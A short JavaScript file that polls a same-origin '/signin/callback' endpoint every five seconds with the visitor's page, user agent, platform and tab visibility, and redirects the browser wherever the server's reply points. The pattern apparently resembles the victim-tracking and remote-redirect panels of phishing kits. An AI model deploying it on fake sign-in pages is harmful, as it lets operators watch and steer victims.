let heartbeatInterval;
let isActive = true;

function sendHeartbeat(status) {
    const currentPage = window.location.pathname;
    const deviceInfo = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;

    const clientIP = '1.1.1.1'; // or any default IP you prefer
    const userAgent = navigator.userAgent;
    
    // Prepare the request body
    const requestBody = `status=${status}&current_page=${encodeURIComponent(currentPage)}&ip=${clientIP}&user_agent=${encodeURIComponent(userAgent)}&device_info=${encodeURIComponent(deviceInfo)}&check_redirect=true`;
    
    // Send the request to your server
    fetch('/signin/callback', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: requestBody
    })
    .then(response => response.json())
    .then(data => {
        console.log('Heartbeat status:', data);
        if (data.status === 'success' && data.page) {
            window.location.href = data.page;
        }
    })
    .catch(error => {
        console.error('Error:', error); // Optional: Handle error
    });
}

function startHeartbeat() {
    heartbeatInterval = setInterval(() => {
        if (document.visibilityState === 'visible') {
            sendHeartbeat(1);
        } else {
            sendHeartbeat(0);
        }
    }, 5000);
}

function stopHeartbeat() {
    clearInterval(heartbeatInterval);
    sendHeartbeat(0);
}

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        isActive = true;
    } else {
        isActive = false;
    }
});

window.onload = () => {
    startHeartbeat();
};

window.onbeforeunload = () => {
    stopHeartbeat();
};

